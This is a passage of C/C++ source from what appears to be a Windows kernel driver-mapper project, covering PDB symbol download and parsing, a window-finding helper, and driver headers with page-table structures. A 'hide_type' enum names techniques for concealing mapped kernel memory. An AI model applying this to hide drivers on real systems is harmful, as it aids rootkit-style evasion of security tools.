    p_data_dir = &p_opt32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
  } else {
    p_data_dir = &p_opt64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
  }

  if (!p_data_dir->Size || p_data_dir->VirtualAddress >= image_size) {
    mapper_log("ERROR", "no debug directory found or invalid debug directory");
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  auto p_debug_dir =
      reinterpret_cast<IMAGE_DEBUG_DIRECTORY*>(image_buffer.get() + p_data_dir->VirtualAddress);
  if (IMAGE_DEBUG_TYPE_CODEVIEW != p_debug_dir->Type) {
    mapper_log("ERROR", "debug directory type is not CodeView");
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  if (p_debug_dir->AddressOfRawData >= image_size) {
    mapper_log("ERROR", "invalid debug raw data address");
    SetLastError(ERROR_INVALID_DATA);
    return "";
  }

  auto pdb_info_ptr =
      reinterpret_cast<pdb_info*>(image_buffer.get() + p_debug_dir->AddressOfRawData);
  if (pdb_info_ptr->signature != 0x53445352) {  // 'RSDS'
    mapper_log("ERROR", "invalid PDB signature");
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  mapper_log("SUCCESS", "found valid PDB info in debug directory");

  // convert GUID to string
  wchar_t w_guid[100] = {0};
  if (!StringFromGUID2(pdb_info_ptr->guid, w_guid, 100)) {
    mapper_log("ERROR", "failed to convert GUID to string");
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  char a_guid[100] = {0};
  size_t l_guid = 0;
  if (wcstombs_s(&l_guid, a_guid, w_guid, sizeof(a_guid)) || !l_guid) {
    mapper_log("ERROR", "failed to convert GUID to multibyte string");
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  // filter GUID (remove non-hex characters)
  char guid_filtered[256] = {0};
  for (size_t i = 0; i != l_guid; ++i) {
    if ((a_guid[i] >= '0' && a_guid[i] <= '9') || (a_guid[i] >= 'A' && a_guid[i] <= 'F') ||
        (a_guid[i] >= 'a' && a_guid[i] <= 'f')) {
      guid_filtered[strlen(guid_filtered)] = a_guid[i];
    }
  }

  char age[16] = {0};
  if (_itoa_s(pdb_info_ptr->age, age, 10) != 0) {
    mapper_log("ERROR", "failed to convert age to string");
    SetLastError(ERROR_NOT_SUPPORTED);
    return "";
  }

  // construct download URL
  std::string url = symbol_server;
  url += pdb_info_ptr->pdb_file_name;
  url += "/";
  url += guid_filtered;
  url += age;
  url += "/";
  url += pdb_info_ptr->pdb_file_name;

  mapper_log("SUCCESS", "download URL: %ws", std::wstring(url.begin(), url.end()).c_str());

  // download PDB
  DeleteFileA(pdb_path.c_str());
  auto hr = URLDownloadToFileA(NULL, url.c_str(), pdb_path.c_str(), NULL, NULL);
  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to download PDB file, HRESULT: 0x%08x", hr);
    SetLastError(12029);
    return "";
  }

  mapper_log("SUCCESS", "PDB downloaded successfully to: %ws",
             std::wstring(pdb_path.begin(), pdb_path.end()).c_str());

  return pdb_path;
}

bool pdb_load(const std::string& pdb_path, p_pdb_context pdb) {
  if (pdb_path.empty() || !pdb) {
    mapper_log("ERROR", "invalid parameters for pdb_load");
    SetLastError(ERROR_INVALID_PARAMETER);
    return false;
  }

  mapper_log("SUCCESS", "loading PDB: %ws", std::wstring(pdb_path.begin(), pdb_path.end()).c_str());

  // Initialize context
  std::memset(pdb, 0, sizeof(pdb_context));

  // create DIA data source
  CComPtr<IDiaDataSource> pSource;
  HRESULT hr = CoCreateInstance(CLSID_DiaSource, NULL, CLSCTX_INPROC_SERVER, IID_IDiaDataSource,
                                (void**)&pSource);

  if (FAILED(hr)) {
    // try alternative method - NoRegCoCreate
    hr = NoRegCoCreate(L"msdia140.dll", CLSID_DiaSource, IID_IDiaDataSource, (void**)&pSource);
    if (FAILED(hr)) {
      mapper_log("ERROR", "failed to create DIA data source: 0x%08x", hr);
      SetLastError(ERROR_NOT_SUPPORTED);
      return false;
    }
  }

  // load PDB data
  std::wstring wide_path(pdb_path.begin(), pdb_path.end());
  hr = pSource->loadDataFromPdb(wide_path.c_str());
  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to load PDB data: 0x%08x", hr);
    SetLastError(ERROR_INVALID_DATA);
    return false;
  }

  // open session
  CComPtr<IDiaSession> pSession;
  hr = pSource->openSession(&pSession);
  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to open DIA session: 0x%08x", hr);
    SetLastError(ERROR_ACCESS_DENIED);
    return false;
  }

  // get global scope
  CComPtr<IDiaSymbol> pGlobal;
  hr = pSession->get_globalScope(&pGlobal);
  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to get global scope: 0x%08x", hr);
    SetLastError(ERROR_ACCESS_DENIED);
    return false;
  }

  // store DIA objects in context (we'll need to cast them back when using)
  pdb->h_pdb_file = (HANDLE)pSource.Detach();     // store as opaque handle
  pdb->h_process = (HANDLE)pSession.Detach();     // store session as process handle
  pdb->base_address = (DWORD64)pGlobal.Detach();  // store global scope

  // verify symbols are loaded by enumerating a few
  mapper_log("SUCCESS", "enumerating symbols for verification...");

  IDiaSession* pSessionRaw = (IDiaSession*)pdb->h_process;
  IDiaSymbol* pGlobalRaw = (IDiaSymbol*)pdb->base_address;

  CComPtr<IDiaEnumSymbols> pEnumSymbols;
  hr = pGlobalRaw->findChildren(SymTagPublicSymbol, NULL, nsNone, &pEnumSymbols);

  if (SUCCEEDED(hr)) {
    LONG count = 0;
    hr = pEnumSymbols->get_Count(&count);
    if (SUCCEEDED(hr) && count > 0) {
      mapper_log("SUCCESS", "found %d public symbols", count);

      // show first few symbols
      CComPtr<IDiaSymbol> pSymbol;
      ULONG celt = 0;
      for (int i = 0;
           i < min(10, count) && SUCCEEDED(pEnumSymbols->Next(1, &pSymbol, &celt)) && celt == 1;
           i++) {
        BSTR name;
        if (SUCCEEDED(pSymbol->get_name(&name))) {
          mapper_log("DEBUG", "Symbol[%d]: %ws", i, name);
          SysFreeString(name);
        }
        pSymbol.Release();
      }
    } else {
      mapper_log("WARNING", "no public symbols found in PDB");
    }
  }

  mapper_log("SUCCESS", "PDB loaded successfully using DIA SDK");
  return true;
}

ULONG pdb_get_rva(p_pdb_context pdb, const std::string& sym_name) {
  if (!pdb || !pdb->h_process || sym_name.empty()) {
    mapper_log("ERROR", "invalid parameters for pdb_get_rva");
    return static_cast<ULONG>(-1);
  }

  IDiaSession* pSession = (IDiaSession*)pdb->h_process;
  IDiaSymbol* pGlobal = (IDiaSymbol*)pdb->base_address;

  // convert symbol name to wide string
  std::wstring wide_name(sym_name.begin(), sym_name.end());

  // find symbol by name
  CComPtr<IDiaEnumSymbols> pEnumSymbols;
  HRESULT hr =
      pGlobal->findChildren(SymTagNull, wide_name.c_str(), nsfCaseInsensitive, &pEnumSymbols);

  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to find symbol '%s': 0x%08x", sym_name.c_str(), hr);
    return static_cast<ULONG>(-1);
  }

  // get first matching symbol
  CComPtr<IDiaSymbol> pSymbol;
  ULONG celt = 0;
  hr = pEnumSymbols->Next(1, &pSymbol, &celt);

  if (FAILED(hr) || celt != 1) {
    // try with public symbols specifically
    pEnumSymbols.Release();
    hr = pGlobal->findChildren(SymTagPublicSymbol, wide_name.c_str(), nsfCaseInsensitive,
                               &pEnumSymbols);

    if (SUCCEEDED(hr)) {
      hr = pEnumSymbols->Next(1, &pSymbol, &celt);
    }

    if (FAILED(hr) || celt != 1) {
      mapper_log("ERROR", "symbol '%s' not found", sym_name.c_str());
      return static_cast<ULONG>(-1);
    }
  }

  // get RVA
  DWORD rva = 0;
  hr = pSymbol->get_relativeVirtualAddress(&rva);

  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to get RVA for symbol '%s': 0x%08x", sym_name.c_str(), hr);
    return static_cast<ULONG>(-1);
  }

  mapper_log("SUCCESS", "Found symbol '%s' at RVA: 0x%x", sym_name.c_str(), rva);
  return static_cast<ULONG>(rva);
}

ULONG pdb_get_struct_property_offset(p_pdb_context pdb, const std::string& struct_name,
                                     const std::wstring& property_name) {
  if (!pdb || !pdb->h_process || struct_name.empty() || property_name.empty()) {
    mapper_log("ERROR", "invalid parameters for pdb_get_struct_property_offset");
    return static_cast<ULONG>(-1);
  }

  IDiaSession* pSession = (IDiaSession*)pdb->h_process;
  IDiaSymbol* pGlobal = (IDiaSymbol*)pdb->base_address;

  // convert struct name to wide string
  std::wstring wide_struct_name(struct_name.begin(), struct_name.end());

  // find UDT (User Defined Type) by name
  CComPtr<IDiaEnumSymbols> pEnumSymbols;
  HRESULT hr =
      pGlobal->findChildren(SymTagUDT, wide_struct_name.c_str(), nsfCaseInsensitive, &pEnumSymbols);

  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to find struct '%s': 0x%08x", struct_name.c_str(), hr);
    return static_cast<ULONG>(-1);
  }

  // get first matching UDT
  CComPtr<IDiaSymbol> pUDT;
  ULONG celt = 0;
  hr = pEnumSymbols->Next(1, &pUDT, &celt);

  if (FAILED(hr) || celt != 1) {
    mapper_log("ERROR", "struct '%s' not found", struct_name.c_str());
    return static_cast<ULONG>(-1);
  }

  // find children (members) of the UDT
  CComPtr<IDiaEnumSymbols> pEnumMembers;
  hr = pUDT->findChildren(SymTagData, NULL, nsNone, &pEnumMembers);

  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to enumerate struct members: 0x%08x", hr);
    return static_cast<ULONG>(-1);
  }

  // iterate through members to find the property
  CComPtr<IDiaSymbol> pMember;
  while (SUCCEEDED(pEnumMembers->Next(1, &pMember, &celt)) && celt == 1) {
    BSTR memberName;
    if (SUCCEEDED(pMember->get_name(&memberName))) {
      if (wcscmp(memberName, property_name.c_str()) == 0) {
        // found the property, get its offset
        LONG offset = 0;
        hr = pMember->get_offset(&offset);
        SysFreeString(memberName);

        if (SUCCEEDED(hr)) {
          mapper_log("SUCCESS", "Found property '%ws' at offset 0x%x in struct '%s'",
                     property_name.c_str(), offset, struct_name.c_str());
          return static_cast<ULONG>(offset);
        }

        mapper_log("ERROR", "failed to get offset for property '%ws': 0x%08x",
                   property_name.c_str(), hr);
        return static_cast<ULONG>(-1);
      }
      SysFreeString(memberName);
    }
    pMember.Release();
  }

  mapper_log("ERROR", "property '%ws' not found in struct '%s'", property_name.c_str(),
             struct_name.c_str());
  return static_cast<ULONG>(-1);
}

ULONG pdb_get_struct_size(p_pdb_context pdb, const std::string& struct_name) {
  if (!pdb || !pdb->h_process || struct_name.empty()) {
    mapper_log("ERROR", "invalid parameters for pdb_get_struct_size");
    return static_cast<ULONG>(-1);
  }

  IDiaSession* pSession = (IDiaSession*)pdb->h_process;
  IDiaSymbol* pGlobal = (IDiaSymbol*)pdb->base_address;

  // convert struct name to wide string
  std::wstring wide_struct_name(struct_name.begin(), struct_name.end());

  // find UDT by name
  CComPtr<IDiaEnumSymbols> pEnumSymbols;
  HRESULT hr =
      pGlobal->findChildren(SymTagUDT, wide_struct_name.c_str(), nsfCaseInsensitive, &pEnumSymbols);

  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to find struct '%s': 0x%08x", struct_name.c_str(), hr);
    return static_cast<ULONG>(-1);
  }

  // get first matching UDT
  CComPtr<IDiaSymbol> pUDT;
  ULONG celt = 0;
  hr = pEnumSymbols->Next(1, &pUDT, &celt);

  if (FAILED(hr) || celt != 1) {
    mapper_log("ERROR", "struct '%s' not found", struct_name.c_str());
    return static_cast<ULONG>(-1);
  }

  // get size
  ULONGLONG size = 0;
  hr = pUDT->get_length(&size);

  if (FAILED(hr)) {
    mapper_log("ERROR", "failed to get size for struct '%s': 0x%08x", struct_name.c_str(), hr);
    return static_cast<ULONG>(-1);
  }

  mapper_log("SUCCESS", "Struct '%s' size: 0x%llx bytes", struct_name.c_str(), size);
  return static_cast<ULONG>(size);
}

void pdb_unload(const std::string& pdb_path, p_pdb_context pdb) {
  if (!pdb) {
    mapper_log("ERROR", "invalid PDB context for unload");
    return;
  }

  mapper_log("SUCCESS", "unloading PDB");

  // release DIA objects
  if (pdb->base_address) {
    IDiaSymbol* pGlobal = (IDiaSymbol*)pdb->base_address;
    pGlobal->Release();
    pdb->base_address = 0;
  }

  if (pdb->h_process) {
    IDiaSession* pSession = (IDiaSession*)pdb->h_process;
    pSession->Release();
    pdb->h_process = nullptr;
  }

  if (pdb->h_pdb_file) {
    IDiaDataSource* pSource = (IDiaDataSource*)pdb->h_pdb_file;
    pSource->Release();
    pdb->h_pdb_file = nullptr;
  }

  // delete PDB file if path provided
  if (!pdb_path.empty()) {
    if (DeleteFileA(pdb_path.c_str())) {
      mapper_log("SUCCESS", "PDB file deleted successfully");
    } else {
      mapper_log("ERROR", "failed to delete PDB file: 0x%lx", GetLastError());
    }
  }

  mapper_log("SUCCESS", "PDB unloaded successfully");
}
```

`client/pdb/pdb.hpp`:

```hpp
#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <memory>

#include "md5.hpp"
#include "../driver_mapper/utils.hpp"
#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "Urlmon.lib")

// Thanks mambda
// https://bitbucket.org/mambda/pdb-parser/src/master/
struct pdb_header_7 {
  char signature[0x20];
  int page_size;
  int allocation_table_pointer;
  int file_page_count;
  int root_stream_size;
  int reserved;
  int root_stream_page_number_list_number;
};

struct root_stream_7 {
  int num_streams;
  int stream_sizes[1];  // num_streams
};

struct guid_stream_data {
  int ver;
  int date;
  int age;
  GUID guid;
};

struct pdb_info {
  DWORD signature;
  GUID guid;
  DWORD age;
  char pdb_file_name[1];
};

#define PDB_BASE_OF_DLL (DWORD64)0x10000000

typedef struct _pdb_context {
  HANDLE h_pdb_file;
  HANDLE h_process;
  DWORD64 base_address;  // Add this field
} pdb_context, *p_pdb_context;

// download PDB file from symbol server
std::string
pdb_download(const std::string& pe_path, const std::string& pdb_download_path = "",
             const std::string& symbol_server = "https://msdl.microsoft.com/download/symbols/");

// load PDB file
bool pdb_load(const std::string& pdb_path, p_pdb_context pdb);

// get function/global variable RVA
ULONG pdb_get_rva(p_pdb_context pdb, const std::string& sym_name);

// get struct property offset
ULONG pdb_get_struct_property_offset(p_pdb_context pdb, const std::string& struct_name,
                                     const std::wstring& property_name);

// get struct size
ULONG pdb_get_struct_size(p_pdb_context pdb, const std::string& struct_name);

// unload PDB and cleanup
void pdb_unload(const std::string& pdb_path, p_pdb_context pdb);
```

`client/utils/logging.h`:

```h
#pragma once
#include <cstdio>
#include <cstring>

#define DISABLE_DEBUG_PRINT 0
#if DISABLE_DEBUG_PRINT
  #define debug_log(level, format, ...) ((void)0)
#else
  #define debug_log(level, format, ...)                                   \
    do {                                                                  \
      const char* prefix;                                                 \
      if (strcmp(level, "SUCCESS") == 0)                                  \
        prefix = "[+]";                                                   \
      else if (strcmp(level, "ERROR") == 0)                               \
        prefix = "[!]";                                                   \
      else if (strcmp(level, "WARNING") == 0)                             \
        prefix = "[-]";                                                   \
      else                                                                \
        prefix = "[*]";                                                   \
      printf("%s %s: " format "\n", prefix, __FUNCTION__, ##__VA_ARGS__); \
    } while (0)
#endif
```

`client/utils/window_manager.cpp`:

```cpp
#include "window_manager.hpp"

window_manager_t::window_manager_t() {}

std::optional<HWND> window_manager_t::find_window(const std::wstring& target_class_name) {
  struct enum_window_data {
    HWND result;
    const std::wstring& target;
    const std::function<std::wstring(const std::wstring&)>& remove_zero_width_space_fn;
    const std::function<bool(const std::wstring&)>& contains_zero_width_space_fn;
  };

  auto remove_zero_width_space_fn = [this](const std::wstring& str) {
    return this->remove_zero_width_space(str);
  };
  auto contains_zero_width_space_fn = [this](const std::wstring& str) {
    return this->contains_zero_width_space(str);
  };

  enum_window_data data = {nullptr, target_class_name, remove_zero_width_space_fn,
                           contains_zero_width_space_fn};

  ::EnumWindows(
      [](HWND hwnd, LPARAM lParam) -> BOOL {
        auto* data = reinterpret_cast<enum_window_data*>(lParam);
        std::array<wchar_t, 80> class_name{};
        ::GetClassNameW(hwnd, class_name.data(), static_cast<int>(class_name.size()));

        std::array<wchar_t, 256> window_title{};
        ::GetWindowTextW(hwnd, window_title.data(), static_cast<int>(window_title.size()));

        std::wstring processed_name = data->remove_zero_width_space_fn(class_name.data());
        std::wstring title = window_title.data();

        if (processed_name == data->target) {
          data->result = hwnd;
          return FALSE;
        }
        return TRUE;
      },
      reinterpret_cast<LPARAM>(&data));

  return data.result ? std::optional<HWND>{data.result} : std::nullopt;
}

bool window_manager_t::get_process_and_thread_id(HWND window, unsigned long& process_id,
                                                 std::uint32_t& thread_id) {
  thread_id = ::GetWindowThreadProcessId(window, &process_id);
  return true;
}

bool window_manager_t::initialize_and_find_window(std::wstring window_name,
                                                  unsigned long& process_id,
                                                  std::uint32_t& thread_id) {
  std::optional<HWND> main_window;
  while (!(main_window = find_window(window_name))) {
    std::this_thread::sleep_for(std::chrono::milliseconds(2));
  }
  if (!get_process_and_thread_id(*main_window, process_id, thread_id)) {
    return false;
  }
  return true;
}

std::wstring window_manager_t::remove_zero_width_space(const std::wstring& str) {
  std::wstring copy = str;
  copy.erase(std::remove(copy.begin(), copy.end(), L'\u200B'), copy.end());
  return copy;
}

bool window_manager_t::contains_zero_width_space(const std::wstring& str) {
  return str.find(L'\u200B') != std::wstring::npos;
}

// global window_manager instance
std::unique_ptr<window_manager_t> g_window_manager = std::make_unique<window_manager_t>();
```

`client/utils/window_manager.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <tchar.h>

#include <algorithm>
#include <array>
#include <chrono>
#include <memory>
#include <optional>
#include <string>
#include <thread>
#include <vector>
#include <functional>

class window_manager_t {
public:
  window_manager_t();

  std::optional<HWND> find_window(const std::wstring& target_class_name);

  bool get_process_and_thread_id(HWND window, unsigned long& process_id, std::uint32_t& thread_id);

  bool initialize_and_find_window(std::wstring window_name, unsigned long& process_id,
                                  std::uint32_t& thread_id);

private:
  bool nt_enum_windows(WNDENUMPROC lp_enum_func, LPARAM l_param);

  std::wstring remove_zero_width_space(const std::wstring& str);

  bool contains_zero_width_space(const std::wstring& str);
};

extern std::unique_ptr<window_manager_t> g_window_manager;
```

`driver/def/def.hpp`:

```hpp
#pragma once

#define ENABLE_DEBUG_PRINT 1

#if ENABLE_DEBUG_PRINT
  #define log(level, format, ...) \
    globals::dbg_print("[=] %s: %s: " format, level, __FUNCTION__, ##__VA_ARGS__)
#else
  #define log(level, format, ...) ((void)0)
#endif

#define MAX_FREE_SPACES 128

#define dereference(ptr) (const uintptr_t)(ptr + *(int*)((BYTE*)ptr + 3) + 7)
#define in_range(x, a, b) (x >= a && x <= b)
#define get_bits(x)                                                \
  (in_range((x & (~0x20)), 'A', 'F') ? ((x & (~0x20)) - 'A' + 0xA) \
                                     : (in_range(x, '0', '9') ? x - '0' : 0))
#define get_byte(x) (get_bits(x[0]) << 4 | get_bits(x[1]))
#define size_align(Size) ((Size + 0xFFF) & 0xFFFFFFFFFFFFF000)
#define to_lower_i(Char) ((Char >= 'A' && Char <= 'Z') ? (Char + 32) : Char)
#define to_lower_c(Char) ((Char >= (char*)'A' && Char <= (char*)'Z') ? (Char + 32) : Char)

#define PAGE_SIZE 0x1000
#define PAGE_SHIFT 12
#define PTE_SHIFT 3
#define VA_SHIFT (63 - 47)
#define BYTES_TO_PAGES(size) (((size) >> PAGE_SHIFT) + (((size) & (PAGE_SIZE - 1)) != 0))
#define MI_GET_VIRTUAL_ADDRESS_MAPPED_BY_PTE(pte) \
  ((PVOID)((LONG_PTR)(((LONG_PTR)(pte)-0xFFFFF68000000000) << (25L)) >> 16))

#define PFN_TO_PAGE(pfn) (pfn << PAGE_SHIFT)
#define PAGE_TO_PFN(pfn) (pfn >> PAGE_SHIFT)

typedef unsigned int uint32_t;
typedef unsigned long ulong32_t;

enum hide_type {
  NONE,
  PFN_EXISTS_BIT,
  MI_REMOVE_PHYSICAL_MEMORY,
  SET_PARITY_ERROR,
  SET_LOCK_BIT,
  HIDE_TRANSLATION
};

enum memory_type {
  NORMAL_PAGE,
  LARGE_PAGE,
  HUGE_PAGE
};

enum memory_space : bool {
  USER_MODE = false,
  KERNEL_MODE = true
};

enum class experimental_options {
  NONE,
  MANIPULATE_SYSTEM_PARTITION
};

// 0x4 bytes (sizeof)
enum _KTHREAD_STATE {
  Initialized = 0,
  Ready = 1,
  Running = 2,
  Standby = 3,
  Terminated = 4,
  Waiting = 5,
  Transition = 6,
  DeferredReady = 7,
  GateWaitObsolete = 8,
  WaitingForProcessInSwap = 9
};
typedef enum _KAPC_ENVIRONMENT {
  OriginalApcEnvironment,
  AttachedApcEnvironment,
  CurrentApcEnvironment,
  InsertApcEnvironment
} KAPC_ENVIRONMENT;

typedef VOID (*PKRUNDOWN_ROUTINE)(IN PKAPC Apc);

typedef VOID (*PKNORMAL_ROUTINE)(IN PVOID NormalContext, IN PVOID SystemArgument1,
                                 IN PVOID SystemArgument2);

typedef VOID (*PKKERNEL_ROUTINE)(IN PKAPC Apc, IN OUT PKNORMAL_ROUTINE* NormalRoutine,
                                 IN OUT PVOID* NormalContext, IN OUT PVOID* SystemArgument1,
                                 IN OUT PVOID* SystemArgument2);

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

#pragma warning(push)
#pragma warning(disable : 4201)  // nonstandard extension used: nameless struct/union

#pragma pack(push, 1)
typedef union CR3_ {
  ULONG64 Value;
  struct {
    ULONG64 Ignored1 : 3;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Ignored2 : 7;
    ULONG64 Pml4 : 40;
    ULONG64 Reserved : 12;
  };
} PTE_CR3;

typedef union VIRT_ADDR_ {
  ULONG64 Value;
  void* Pointer;
  struct {
    ULONG64 Offset : 12;
    ULONG64 PtIndex : 9;
    ULONG64 PdIndex : 9;
    ULONG64 PdptIndex : 9;
    ULONG64 Pml4Index : 9;
    ULONG64 Reserved : 16;
  };
} VIRTUAL_ADDRESS;

typedef union PML4E_ {
  ULONG64 Value;
  struct {
    ULONG64 Present : 1;
    ULONG64 Rw : 1;
    ULONG64 User : 1;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Accessed : 1;
    ULONG64 Ignored1 : 1;
    ULONG64 Reserved1 : 1;
    ULONG64 Ignored2 : 4;
    ULONG64 Pdpt : 40;
    ULONG64 Ignored3 : 11;
    ULONG64 Xd : 1;
  };
} PML4E_NEW;

typedef union PDPTE_ {
  ULONG64 Value;
  struct {
    ULONG64 Present : 1;
    ULONG64 Rw : 1;
    ULONG64 User : 1;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Accessed : 1;
    ULONG64 Dirty : 1;
    ULONG64 PageSize : 1;
    ULONG64 Ignored2 : 4;
    ULONG64 Pd : 40;
    ULONG64 Ignored3 : 11;
    ULONG64 Xd : 1;
  };
} PDPTE_NEW;

typedef union PDE_ {
  ULONG64 Value;
  struct {
    ULONG64 Present : 1;
    ULONG64 Rw : 1;
    ULONG64 User : 1;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Accessed : 1;
    ULONG64 Dirty : 1;
    ULONG64 PageSize : 1;
    ULONG64 Ignored2 : 4;
    ULONG64 Pt : 40;
    ULONG64 Ignored3 : 11;
    ULONG64 Xd : 1;
  };
} PDE_NEW;

typedef union PTE_ {
  ULONG64 Value;
  VIRTUAL_ADDRESS VirtualAddress;
  struct {
    ULONG64 Present : 1;
    ULONG64 Rw : 1;
    ULONG64 User : 1;
    ULONG64 WriteThrough : 1;
    ULONG64 CacheDisable : 1;
    ULONG64 Accessed : 1;
    ULONG64 Dirty : 1;
    ULONG64 Pat : 1;
    ULONG64 Global : 1;
    ULONG64 Ignored1 : 3;
    ULONG64 PageFrame : 40;
    ULONG64 Ignored3 : 11;
    ULONG64 Xd : 1;
  };
} PTE_NEW;
#pragma pack(pop)

#pragma warning(pop)

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _LDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  WORD LoadCount;
  WORD TlsIndex;
  union {
    LIST_ENTRY HashLinks;
    struct {
      PVOID SectionPointer;
      ULONG CheckSum;
    };
  };
  union {
    ULONG TimeDateStamp;
    PVOID LoadedImports;
  };
  VOID* EntryPointActivationContext;
  PVOID PatchInformation;
  LIST_ENTRY ForwarderLinks;
  LIST_ENTRY ServiceTagLinks;
  LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _RTL_CRITICAL_SECTION {
  VOID* DebugInfo;
  LONG LockCount;
  LONG RecursionCount;
  PVOID OwningThread;
  PVOID LockSemaphore;
  ULONG SpinCount;
} RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;

typedef struct _PEB_LDR_DATA {
  ULONG Length;
  UCHAR Initialized;
  PVOID SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
  PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
  UCHAR InheritedAddressSpace;
  UCHAR ReadImageFileExecOptions;
  UCHAR BeingDebugged;
  UCHAR BitField;
  ULONG ImageUsesLargePages : 1;
  ULONG IsProtectedProcess : 1;
  ULONG IsLegacyProcess : 1;
  ULONG IsImageDynamicallyRelocated : 1;
  ULONG SpareBits : 4;
  PVOID Mutant;
  PVOID ImageBaseAddress;
  PPEB_LDR_DATA Ldr;
  VOID* ProcessParameters;
  PVOID SubSystemData;
  PVOID ProcessHeap;
  PRTL_CRITICAL_SECTION FastPebLock;
  PVOID AtlThunkSListPtr;
  PVOID IFEOKey;
  ULONG CrossProcessFlags;
  ULONG ProcessInJob : 1;
  ULONG ProcessInitializing : 1;
  ULONG ReservedBits0 : 30;
  union {
    PVOID KernelCallbackTable;
    PVOID UserSharedInfoPtr;
  };
  ULONG SystemReserved[1];
  ULONG SpareUlong;
  VOID* FreeList;
  ULONG TlsExpansionCounter;
  PVOID TlsBitmap;
  ULONG TlsBitmapBits[2];
  PVOID ReadOnlySharedMemoryBase;
  PVOID HotpatchInformation;
  VOID** ReadOnlyStaticServerData;
  PVOID AnsiCodePageData;
  PVOID OemCodePageData;
  PVOID UnicodeCaseTableData;
  ULONG NumberOfProcessors;
  ULONG NtGlobalFlag;
  LARGE_INTEGER CriticalSectionTimeout;
  ULONG HeapSegmentReserve;
  ULONG HeapSegmentCommit;
  ULONG HeapDeCommitTotalFreeThreshold;
  ULONG HeapDeCommitFreeBlockThreshold;
  ULONG NumberOfHeaps;
  ULONG MaximumNumberOfHeaps;
  VOID** ProcessHeaps;
  PVOID GdiSharedHandleTable;
  PVOID ProcessStarterHelper;
  ULONG GdiDCAttributeList;
  PRTL_CRITICAL_SECTION LoaderLock;
  ULONG OSMajorVersion;
  ULONG OSMinorVersion;
  WORD OSBuildNumber;
  WORD OSCSDVersion;
  ULONG OSPlatformId;
  ULONG ImageSubsystem;
  ULONG ImageSubsystemMajorVersion;
  ULONG ImageSubsystemMinorVersion;
  ULONG ImageProcessAffinityMask;
  ULONG GdiHandleBuffer[34];
  PVOID PostProcessInitRoutine;
  PVOID TlsExpansionBitmap;
  ULONG TlsExpansionBitmapBits[32];
  ULONG SessionId;
  ULARGE_INTEGER AppCompatFlags;
  ULARGE_INTEGER AppCompatFlagsUser;
  PVOID pShimData;
  PVOID AppCompatInfo;
  UNICODE_STRING CSDVersion;
  VOID* ActivationContextData;
  VOID* ProcessAssemblyStorageMap;
  VOID* SystemDefaultActivationContextData;
  VOID* SystemAssemblyStorageMap;
  ULONG MinimumStackCommit;
  VOID* FlsCallback;
  LIST_ENTRY FlsListHead;
  PVOID FlsBitmap;
  ULONG FlsBitmapBits[4];
  ULONG FlsHighIndex;
  PVOID WerRegistrationData;
  PVOID WerShipAssertPtr;
} PEB, *PPEB;
typedef struct _SYSTEM_PROCESS_INFORMATION {
  ULONG NextEntryOffset;
  ULONG NumberOfThreads;
  LARGE_INTEGER SpareLi1;
  LARGE_INTEGER SpareLi2;
  LARGE_INTEGER SpareLi3;
  LARGE_INTEGER CreateTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER KernelTime;
  UNICODE_STRING ImageName;
  KPRIORITY BasePriority;
  ULONG_PTR UniqueProcessId;
  ULONG_PTR InheritedFromUniqueProcessId;
  ULONG HandleCount;
  // Next part is platform dependent
  // ...
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
  SystemBasicInformation,
  SystemProcessorInformation,
  SystemPerformanceInformation,
  SystemTimeOfDayInformation,
  SystemPathInformation,
  SystemProcessInformation,
  SystemCallCountInformation,
  SystemDeviceInformation,
  SystemProcessorPerformanceInformation,
